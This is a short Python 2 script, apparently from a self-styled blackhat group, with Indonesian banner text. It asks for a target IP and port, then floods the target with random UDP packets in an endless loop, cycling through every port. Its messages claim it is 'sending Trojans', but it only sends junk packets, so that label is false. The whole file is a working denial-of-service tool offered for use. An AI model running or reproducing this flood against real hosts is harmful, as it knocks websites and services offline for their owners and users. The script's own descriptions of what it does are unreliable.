import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "{red}RUTINITAS TIDAK WARAS!!!!"

print "=================================================="
print "AUTHOR       : JAVXZZ NOT HUMAN 666"
print "ORGANISASI   : BLACKHAT TEAM CYBER MATA ELANG"
print "SC GITHUB    : https://github.com/ALUMINAUM/ATT4CK"
print "=================================================="
print
ip = raw_input("IP WEBSITE : ")
port = input("PORT WEBSITE     : ")

os.system("clear")
os.system("figlet Ssdang Mengirimkan Trojan")
time.sleep(7)
print "SABAR LOADING DATABASE"
time.sleep(5)
os.system("clear")
print " Loading Send Trojan Web.."
time.sleep(8)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Mengirim %s Trojan Ke %s Ke Website %s"%(sent,ip,port)
     if port == 65534:
       port = 1
